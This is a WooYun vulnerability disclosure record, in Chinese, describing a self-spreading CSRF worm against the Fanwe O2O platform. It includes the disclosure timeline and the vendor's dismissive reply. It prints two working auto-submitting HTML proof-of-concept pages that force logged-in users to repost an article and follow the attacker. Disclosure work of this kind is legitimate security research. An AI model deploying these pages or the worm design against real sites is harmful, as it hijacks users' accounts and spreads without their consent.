{"id": 67321, "wybug_id": "wooyun-2015-0132561", "wybug_title": "方维o2o系统完整版的CSRF蠕虫(通过传播蠕虫来刷粉丝)#4", "wybug_corp": "fanwe.com", "wybug_author": "苏安泽", "wybug_date": "2015-08-11 11:39", "wybug_open_date": "2015-11-14 11:41", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["那些年我们一起学过的", "蠕虫集合", "正式版"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-16：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-14：\t细节向公众公开  简要描述： 方维o2o系统完整的CSRF蠕虫(利用传播蠕虫刷粉丝，附上我的思路)#4，4个通用啦。方维厂商良心厂商啊，礼物不要了请我去吃个方便面就行了！ 详细说明：     漏洞证明：  \nhttp://o2o.fanwe.net/index.php?ctl=uc_home\n开始啦，我就自己本地构造一些表单。只为了测试所以就简单点在本地的apache服务器上搭建就行了。第一个：poc.html（一个自动转播文章的csrf蠕虫页面），第二个：poc2.html（是一个自动关注的页面）！OK，下面我就随便注册了两个账号来测试，现在就附上截图证明一下！\n\n\n\nOK，现在可以看到我是只有一条的文章和还没关注的状态中！现在访问一下poc.html访问后页面返回的结果：{\"status\":1,\"info\":\"\\u8f6c\\u53d1\\u6210\\u529f\"}现在访问一下poc2页面，返回结果：{\"tag\":1,\"html\":\"\\u53d6\\u6d88\\u5173\\u6ce8\"}好了，从这两个返回的正侧表达式来看，两个都是1,1为true。现在看一下效果图：\n\n\n\n我是如何去套这两个csrf的思路：首先我是先发布一个很吸引用户的文章，里面带了两个链接，一共构造了3个页面，主要页面放在poc.html、poc2.html之上，在我的文章里面添加一个页面里面是嵌入了我的poc.html的页面/poc2.html这两个页面进去的。当用户访问我的主页面的时候里面已经嵌入了这两个页面，这两个页面是用JS来实现自动向服务器提交我需要的数据，一个是转播我的文章，一个是自动关注我。转播能让广大的用户也中了这个全套。附上poc.html/poc2.html页面的代码：poc.html\n<html>    <head>        <meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"/>        <title>poc2</title>    </head>  <body>    <form action=\"http://o2o.fanwe.net/index.php?ctl=ajax\" method=\"POST\">      <input type=\"hidden\" name=\"act\" value=\"do_relay_topic\" />      <input type=\"hidden\" name=\"id\" value=\"257\" />    </form>      <script>      document.forms[0].submit();      </script>  </body></html>\npoc2.html\n<html>    <head>    <meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"/>    </head>  <body>    <form action=\"http://o2o.fanwe.net/index.php\">      <input type=\"hidden\" name=\"ctl\" value=\"ajax\" />      <input type=\"hidden\" name=\"act\" value=\"focus\" />      <input type=\"hidden\" name=\"uid\" value=\"150\" />    </form>      <script>      document.forms[0].submit();      </script>  </body></html>\n   修复方案：     版权声明：转载请注明来源 苏安泽@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-11-14 11:41 厂商回复：  漏洞Rank：2  (WooYun评价) 最新状态： 2015-08-17：CSRF漏洞确认，后续升级更新修复  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}